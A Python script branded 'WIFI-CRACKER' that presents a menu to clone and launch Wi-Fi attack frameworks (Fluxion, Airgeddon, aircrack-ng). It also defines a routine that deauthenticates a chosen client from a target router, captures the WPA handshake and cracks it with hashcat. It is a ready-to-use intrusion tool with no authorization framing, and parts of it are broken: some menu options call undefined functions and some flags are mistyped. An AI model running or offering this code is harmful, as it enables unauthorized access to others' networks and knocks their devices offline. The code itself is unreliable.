#!/usr/bin/python
# -*- coding: utf8 -*-

'''imports'''
import os
import sys
from pathlib import Path
import time
import subprocess



class bcolor:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def banner():
    print(bcolor.GREEN + '''     
                                  :^!?YPGGBBBBBBBBBBBBBBGG5Y?!^:                                   
                             .^7YPGGP5Y?!~^::....  ....::^~!?Y5GGGPY7^.                             
                         .!YGBG5?~:.                            .:~?5GBPJ~.                         
                      ^JGBGJ~:                                        :!JGBG?^                      
                   ^JBB5!.                                                :!5BBJ^                   
                .7G#5~.                                                      .!P#G7.                
              :Y#B7.                                                            .?B#J:              
            :5&G~                       .......      .......                       !G&Y:            
          .J&G~         ::         ...                        ...         ::         ~G&J.          
         !##!       ^7PG?:     ..                                  ..     :?G57^       7##~         
       .5@Y.   .:.7B@@P:    ..                                        ..    ^P@@G7 :.   .5@Y        
      ^#&~   ~PJ~G@@#!    .                  WIFI-CRACKER                .    7#@@P^Y5~   !&B:      
     !@B:  .P@5.B@BJ77  .                  -----------------               .  7!J#@G.P@5   :#&~     
    !@P  :.P@@:JP77PB: .                  AUTHO : @MH13CYBER                  ^BP77G?^@@5.: .G@~    
   ~@G  JJ~@@5.?5#@P:                    ---------------------                ^G@#57 P@@^Y? .B@^   
  :&#. Y@!!@#?B@#5^ .                                                           .~5#@B?#@~7@J :&#.  
  G@^ ~@@7^@#&P!7! .                                                            . !7!P&#@:?@@^ ~@P  
 7@J  Y@@Y:&Y~7BB:.                                                              .^#G7!5&:P@@J  5@! 
 B&.  5@@G:7J&@#:.                                                                .^#@#J7:B@@J  :@G 
!@Y :~!@@P~#@@5. .                                                                 .:P@@#^G@@~~. 5@~
5@~ YY P@P#@B~!.. ...  ... ..  ..   .:   .::    ::.  :.  .:...::.  ..:::. ..::.    .:!~B@BP@5 5? !@Y
#&. B&..&#@? ?B .                                                                  ..#7 J@&#.:&G :@B
@B  G@P !@!.P@Y .	░▒█▀▄▀█░▒█░▒█░▄█░░█▀▀█░▒█▀▀▄░▒█░░▒█░▒█▀▀▄░▒█▀▀▀░▒█▀▀▄      . 5@5 7@~ G@P .#&
@B  J@@P.7:#@@^ . 	░▒█▒█▒█░▒█▀▀█░░█▒░░▒▀▄░▒█░░░░▒▀▄▄▄▀░▒█▀▀▄░▒█▀▀▀░▒█▄▄▀      . ^@@B:7.G@@7 .#@
@B  :&@@5 G@@J 		░▒█░░▒█░▒█░▒█░▄█▄░█▄▄█░▒█▄▄▀░░░▒█░░░▒█▄▄█░▒█▄▄▄░▒█░▒█      . 5@@P P@@#. .#&  
#&. ^~&@@7&@G ?...                                                                 ..?.B@#7@@&^^ :@B
5@~ G^:G@G#@^.&? . ...  ... ..  ..   .:   .::    ::.  :.  .:...::.  ..:::. ..::.  . Y& !@#B@P.~P !@Y
!@Y 5@? 7#@B ?@B ..                                                               ..#@! #@B! ?@Y P@~
 B&.:#@B!:YP B@@^ .                                                              . ~@@P GJ:7#@B.:@G 
 !@Y :G@@B7^.&@@~^^                                                              ~^!@@#.^?#@@G: 5@~ 
  P@~  ?&@@G^5@@7.#?.                                                          .JB.?@@Y~B@@#7  !@5  
  :&#. ~~J#@@5#@5 5@Y.                                                        .P@Y P@B5@@B?~^ :&#.  
   ~@G :G?:~YB#@@:!@@5 .                                                     .P@@^^@@#BJ^:?P..B&^   
    !@G :B&5~:^?G5.#@@J :                                                  : Y@@B.5P7^:!5&G..B@~    
     ~&B: ?#@@GY77:~&@@!7P!.                                            .!P!7@@#^:77YB@@#7 :#&^     
      ^B&!  !P&@@@#5JG@#:?@G?P?:                                    .!Y?B@7^&@G?5#@@@&P!  !@B:      
       .5@Y.  ~?YG#@@##@&~7@@@@&GJ~.                            .^?P#@@@@!~&@##@@#GY7^  .5@Y        
         !##!  7J7~~~!7?Y5~^5#@@@@@&B5?~^.                .:~7YG#@@@@@#Y^!5Y?7!~~~7J7  7&B~         
          .J&G~ :JG##BGGPPG5Y5G#&@@@@@@@@&BGP5YJJ???JY5PGB#&@@@@@@@&BG5YPGPPGGB##GJ: !B&?           
            :Y&G~  :!YPB#&&&&#BG5J7!Y@@@@@@@@@@@@@@@@@@@@@@@@@@J!7J5GB&&&&&#BPY!:  !B&J.            
              :J#B?.  ^7!~~^^^^^!?P#@@@@@@@@@@@@@@@@@@@@@@@@@@@@#P?!^^^^^~~!7^  .?B#J.              
                .7G#P!.:75B#&&@@@@@&&@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@&&#G57..!P#G!                 
                   ^JB#5!..:^!777!^.P@@@@@@@@@@@@@@@@@@@@@@@@@@5.~!77!!^. :!P#G?:                   
                      ^?PBGJ~.      B@@@@@@@@@@@@@@@@@@@@@@@@@@G      :!YGBP?:                      
                         .~JPBG5J!::&@@@@@@@@@@@@@@@@@@@@@@@@@@#:^!JPGBPJ~.                         
                             .^7JPGB&@@@@@@@@@@@@@@@@@@@@@@@@@@&GGPJ!^.                             
                                   .^~7JYPGB##&&@@@@&&##BGPYJ7~:.                                                       
    ''')

# Print banner

print()

def bar():
    total = 1007  # total number to reach
    bar_length = 70  # should be less than 100
    for i in range(total + 1):
        percent = 100.0 * i / total
        sys.stdout.write('\r')
        sys.stdout.write("Completed: [{:{}}] {:>3}%"
                         .format('~' * int(percent / (100.0 / bar_length)),
                                 bar_length, int(percent)))
        sys.stdout.flush()
        time.sleep(0.002)

# Print progress bar
bar()
print()

def check_tool_installed(tool_name):
    try:
        subprocess.run([tool_name, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except FileNotFoundError:
        return False


def check_tools():
    required_tools = ["sudo", "hcxdumptool", "hcxpcapngtool", "hashcat", "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
    missing_tools = []

    for tool in required_tools:
        if not check_tool_installed(tool):
            missing_tools.append(tool)

    if len(missing_tools) == 0:
        print("All required tools are installed.")
    else:
        print("The following tools are missing:")
        for tool in missing_tools:
            print(tool)


class Tool:
    def __init__(self):
        try:
            # Print banner and progress bar
            banner()
            bar()
            print()

            # User tool selection
            self.set_tool = int(input(bcolor.RED + '''
            Select the tool:
            1. AIRCRACK
            2. Fluxion
            3. Airgeddon
            4. Run hcxdumptool
            5. Run hcxpcapngtool
            6. Run airodump-ng (advanced)
            7. Run airodump-ng (simple)
            8. Quit
            '''))

            # Check if the selected tool is within the valid range
            if self.set_tool > 8 or self.set_tool < 1:
                print(bcolor.YELLOW + 'ERROR: Invalid option. Allah Hafiz!')
                sys.exit(1)
        except ValueError:
            print(bcolor.YELLOW + 'ERROR: Invalid input. Allah Hafiz!')
            sys.exit(1)

    def install(self):
        try:
            # Install selected tool based on user input
            if self.set_tool == 1:
                print(bcolor.RED, banner())
                bar()
                print()
                os.system('git clone https://github.com/aircrack-ng/aircrack-ng && cd aircrack-ng')
                os.system('autoreconf -i')
                os.system('./configure --with-experimental')
                os.system('make')
                os.system('make install')
                os.system('ldconfig')
                os.system('aircrack-ng -h')
            elif self.set_tool == 2:
                print(bcolor.RED, banner())
                bar()
                os.system('git clone https://www.github.com/FluxionNetwork/fluxion.git && cd fluxion/ && sudo ./fluxion.sh')

            elif self.set_tool == 3:
                print(bcolor.RED, banner())
                bar()
                print()
                os.system('git clone --depth 1 https://github.com/v1s1t0r1sh3r3/airgeddon.git && cd airgeddon && bash airgeddon.sh')
            elif self.set_tool == 4:
                hcxdumptool_menu()
            elif self.set_tool == 5:
                hcxpcapngtool_menu()
            elif self.set_tool == 6:
                airodump_ng_menu()
            elif self.set_tool == 7:
                airodump_ng_simple_menu()
            elif self.set_tool == 8:
                print('Goodbye!')
                sys.exit(0)
        except Exception as e:
            print(f'ERROR: {e}')
        finally:
            # After installing the tool, clear the console and display the tool's help information
            if self.set_tool == 1:
                os.system('clear')
                os.system('aircrack-ng -h')
            elif self.set_tool == 2:
                os.system('clear')
                os.system('fluxion')
            elif self.set_tool == 3:
                os.system('clear')
                os.system('airgeddon')
            elif self.set_tool == 4:
                os.system('clear')
                os.system('hcxdumptool -h')
            elif self.set_tool == 5:
                os.system('clear')
                os.system('hcxpcapngtool -h')
            elif self.set_tool == 6:
                os.system('clear')
                os.system('airodump-ng -h')
            elif self.set_tool == 7:
                os.system('clear')
                os.system('airodump-ng -h')
            elif self.set_tool == 8:
                sys.exit(0)


def stop_services():
    subprocess.run(["sudo", "systemctl", "stop", "NetworkManager.service"])
    subprocess.run(["sudo", "systemctl", "stop", "wpa_supplicant.service"])


def start_services():
    subprocess.run(["sudo", "systemctl", "start", "wpa_supplicant.service"])
    subprocess.run(["sudo", "systemctl", "start", "NetworkManager.service"])


def run_hcxdumptool(interface, dumpfile):
    subprocess.run(["sudo", "hcxdumptool", "-i", interface, "-o", dumpfile, "–active_beacon", "–enable_status=15"])


def run_hcxpcapngtool(input_file, output_file, wordlist):
    subprocess.run(["hcxpcapngtool", "-o", output_file, "-E", "essidlist", input_file])
    subprocess.run(["hashcat", "-m", "22000", output_file, wordlist])


def run_airodump_ng(interface, router_channel, target_router, fname, target_device, wordlist):
    # Step 1: Start monitor mode
    subprocess.run(["airmon-ng", "start", interface])
    # Step 2: Start airodump-ng to capture all APs and clients
    subprocess.Popen(["airodump-ng", interface])
    # Step 3: Start airodump-ng to capture traffic for target router
    subprocess.Popen(["airodump-ng", "-c", router_channel, "--bssid", target_router, "-w", fname, interface])
    # Step 4: Send deauth packets to target device to capture handshake
    subprocess.Popen(["aireplay-ng", "-0", "1", "-a", target_router, "-c", target_device, interface])
    # Step 5: Use hashcat to crack the captured handshake
    subprocess.run(["hashcat", "-m", "2500", fname + ".cap", wordlist])


def run_airodump_ng_simple(interface, router_channel):
    # Step 1: Start monitor mode
    subprocess.run(["airmon-ng", "start", interface])
    # Step 2: Start airodump-ng to capture traffic for target router
    subprocess.run(["airodump-ng", "-c", router_channel, interface])


if __name__ == "__main__":
    stop_services()
    check_tools()
    start_services()

    # Create an instance of the Tool class
    tool = Tool()

    # Install the selected tool
    tool.install()
